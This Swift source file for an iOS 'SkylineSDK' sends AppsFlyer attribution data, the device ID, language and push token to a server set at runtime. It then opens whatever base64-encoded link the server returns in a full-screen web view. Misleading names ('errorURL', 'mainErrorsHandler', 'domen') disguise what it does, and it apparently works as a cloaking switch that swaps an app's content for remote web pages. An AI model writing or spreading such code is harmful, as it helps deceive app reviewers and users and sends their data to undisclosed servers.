import Foundation
import UIKit
import AppsFlyerLib
import Alamofire
import SwiftUI
import AppTrackingTransparency
import AdSupport
import SdkPushExpress
import Combine
import WebKit

public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
    
    @AppStorage("initialURL") var initialURL: String?
    @AppStorage("statusFlag") var statusFlag: Bool = false
    @AppStorage("finalData") var finalData: String?
    
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        // Create the dictionary in the desired order:
        var conversionData = [String: Any]()
        
        // 1) AFdata
        conversionData[appsDataString] = conversionInfo
        
        // 2) AF_user_id
        conversionData[appsIDString] = AppsFlyerLib.shared().getAppsFlyerUID()
        
        // 3) language
        conversionData[langString] = Locale.current.languageCode
        
        // 4) deviceToken
        conversionData[tokenString] = deviceToken
        
        let jsonData = try! JSONSerialization.data(withJSONObject: conversionData, options: .fragmentsAllowed)
        let jsonString = String(data: jsonData, encoding: .utf8) ?? ""
        
        sendDataToServer(code: jsonString) { result in
            switch result {
            case .success(let message):
                self.sendNotification(name: "SkylineSDKNotification", message: message)
            case .failure:
                self.sendNotificationError(name: "SkylineSDKNotification")
            }
        }
    }
    
    public func onConversionDataFail(_ error: any Error) {
        self.sendNotificationError(name: "SkylineSDKNotification")
    }
    
    private func sendNotification(name: String, message: String) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(
                name: NSNotification.Name(name),
                object: nil,
                userInfo: ["notificationMessage": message]
            )
        }
    }
    
    private func sendNotificationError(name: String) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(
                name: NSNotification.Name(name),
                object: nil,
                userInfo: ["notificationMessage": "Error occurred"]
            )
        }
    }
    
    public static let shared = SkylineSDK()
    private var hasSessionStarted = false
    private var deviceToken: String = ""
    private var session: Session
    private var cancellables = Set<AnyCancellable>()
    
    private var appsDataString: String = ""
    private var appsIDString: String = ""
    private var langString: String = ""
    private var tokenString: String = ""
    
    private var domen: String = ""
    private var paramName: String = ""
    private var mainWindow: UIWindow?
    
    private override init() {
        let sessionConfig = URLSessionConfiguration.default
        sessionConfig.timeoutIntervalForRequest = 20
        sessionConfig.timeoutIntervalForResource = 20
        self.session = Alamofire.Session(configuration: sessionConfig)
    }
    
    public func initialize(
        appsFlyerKey: String,
        appID: String,
        pushExpressKey: String,
        appsDataString: String,
        appsIDString: String,
        langString: String,
        tokenString: String,
        domen: String,
        paramName: String,
        application: UIApplication,
        window: UIWindow,
        completion: @escaping (Result<String, Error>) -> Void
    ) {
        
        self.appsDataString = appsDataString
        self.appsIDString = appsIDString
        self.langString = langString
        self.tokenString = tokenString
        self.domen = domen
        self.paramName = paramName
        self.mainWindow = window
        
        try? PushExpressManager.shared.initialize(appId: pushExpressKey)
        
        AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerKey
        AppsFlyerLib.shared().appleAppID = appID
        AppsFlyerLib.shared().delegate = self
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 15)
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSessionDidBecomeActive),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        
        completion(.success("Initialization completed successfully"))
    }
    
    public func registerForRemoteNotifications(deviceToken: Data) {
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        PushExpressManager.shared.transportToken = tokenString
        self.deviceToken = tokenString
    }
    
    @objc private func handleSessionDidBecomeActive() {
        if !self.hasSessionStarted {
            AppsFlyerLib.shared().start()
            self.hasSessionStarted = true
            ATTrackingManager.requestTrackingAuthorization { _ in }
        }
    }
    
    public func sendDataToServer(code: String, completion: @escaping (Result<String, Error>) -> Void) {
        let parameters = [paramName: code]
        session.request(domen, method: .get, parameters: parameters)
            .validate()
            .responseString { response in
                switch response.result {
                case .success(let base64String):
                    
                    guard let jsonData = Data(base64Encoded: base64String) else {
                        let error = NSError(domain: "SkylineSDK", code: -1,
                                            userInfo: [NSLocalizedDescriptionKey: "Invalid base64 data"])
                        completion(.failure(error))
                        return
                    }
                    do {
                        let decodedData = try JSONDecoder().decode(ResponseData.self, from: jsonData)
                        
                        PushExpressManager.shared.tags["webmaster"] = decodedData.naming
                        self.statusFlag = decodedData.first_link
                        try? PushExpressManager.shared.activate()
                        
                        if self.initialURL == nil {
                            self.initialURL = decodedData.link
                            completion(.success(decodedData.link))
                        } else if decodedData.link == self.initialURL {
                            if self.finalData != nil {
                                completion(.success(self.finalData!))
                            } else {
                                completion(.success(decodedData.link))
                            }
                        } else if self.statusFlag {
                            self.finalData = nil
                            self.initialURL = decodedData.link
                            completion(.success(decodedData.link))
                        } else {
                            self.initialURL = decodedData.link
                            if self.finalData != nil {
                                completion(.success(self.finalData!))
                            } else {
                                completion(.success(decodedData.link))
                            }
                        }
                        
                    } catch {
                        completion(.failure(error))
                    }
                    
                case .failure:
                    try? PushExpressManager.shared.activate()
                    completion(.failure(NSError(domain: "SkylineSDK", code: -1, userInfo: [NSLocalizedDescriptionKey: "Error occurred"])))
                }
            }
    }
    
    struct ResponseData: Codable {
        var link: String
        var naming: String
        var first_link: Bool
    }
    
    func showWeb(with url: String) {
        self.mainWindow = UIWindow(frame: UIScreen.main.bounds)
        let webController = WebController()
        webController.errorURL = url
        let navController = UINavigationController(rootViewController: webController)
        self.mainWindow?.rootViewController = navController
        self.mainWindow?.makeKeyAndVisible()
    }
    
    
    public class WebController: UIViewController, WKNavigationDelegate, WKUIDelegate {
        
        private var mainErrorsHandler: WKWebView!
        
        @AppStorage("savedData") var savedData: String?
        @AppStorage("statusFlag") var statusFlag: Bool = false
        
        public var errorURL: String!
        
        public override func viewDidLoad() {
            super.viewDidLoad()
            
            let config = WKWebViewConfiguration()
            config.preferences.javaScriptEnabled = true
            config.preferences.javaScriptCanOpenWindowsAutomatically = true
            
            let viewportScript = """
            var meta = document.createElement('meta');
            meta.name = 'viewport';
            meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
            document.getElementsByTagName('head')[0].appendChild(meta);
            """
            let userScript = WKUserScript(source: viewportScript, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
            config.userContentController.addUserScript(userScript)
            
            mainErrorsHandler = WKWebView(frame: .zero, configuration: config)
            mainErrorsHandler.isOpaque = false
            mainErrorsHandler.backgroundColor = .white
            mainErrorsHandler.uiDelegate = self
            mainErrorsHandler.navigationDelegate = self
            mainErrorsHandler.allowsBackForwardNavigationGestures = true
            
            view.addSubview(mainErrorsHandler)
            mainErrorsHandler.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                mainErrorsHandler.topAnchor.constraint(equalTo: view.topAnchor),
                mainErrorsHandler.bottomAnchor.constraint(equalTo: view.bottomAnchor),
                mainErrorsHandler.leadingAnchor.constraint(equalTo: view.leadingAnchor),
                mainErrorsHandler.trailingAnchor.constraint(equalTo: view.trailingAnchor)
            ])
            
            loadContent(urlString: errorURL)
        }
        
        public func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            if SkylineSDK.shared.finalData == nil{
                let finalUrl = webView.url?.absoluteString ?? ""
                SkylineSDK.shared.finalData = finalUrl
            }
        }
        
        public override func viewWillAppear(_ animated: Bool) {
            super.viewWillAppear(animated)
            navigationItem.largeTitleDisplayMode = .never
            navigationController?.isNavigationBarHidden = true
        }
        
        private func loadContent(urlString: String) {
            guard let encodedURL = urlString.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
                  let url = URL(string: encodedURL) else { return }
            let request = URLRequest(url: url)
            mainErrorsHandler.load(request)
        }
        
        public func webView(_ webView: WKWebView,
                            createWebViewWith configuration: WKWebViewConfiguration,
                            for navigationAction: WKNavigationAction,
                            windowFeatures: WKWindowFeatures) -> WKWebView? {
            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.navigationDelegate = self
            popupWebView.uiDelegate = self
            popupWebView.allowsBackForwardNavigationGestures = true
            
            mainErrorsHandler.addSubview(popupWebView)
            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: mainErrorsHandler.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: mainErrorsHandler.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: mainErrorsHandler.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: mainErrorsHandler.trailingAnchor)
            ])
            
            return popupWebView
        }
        
    }
    
    public struct WebControllerSwiftUI: UIViewControllerRepresentable {
        public var errorDetail: String
        
        public init(errorDetail: String) {
            self.errorDetail = errorDetail
        }
        
        public func makeUIViewController(context: Context) -> WebController {
            let viewController = WebController()
            viewController.errorURL = errorDetail
            return viewController
        }
        
        public func updateUIViewController(_ uiViewController: WebController, context: Context) {}
    }
}
